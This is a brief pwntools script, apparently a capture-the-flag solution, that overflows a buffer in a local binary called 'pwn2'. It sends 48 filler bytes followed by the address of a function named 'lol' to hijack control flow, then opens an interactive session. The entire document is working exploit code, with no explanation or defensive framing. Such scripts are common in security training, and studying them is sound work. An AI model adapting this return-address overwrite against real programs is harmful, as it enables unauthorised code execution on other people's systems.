from pwn import *

elf=ELF('./pwn2')
garbage = b"A"*48
target=p32(elf.symbols['lol'])
payload = garbage + target
p=process('./pwn2')
p.sendline(payload)
p.interactive()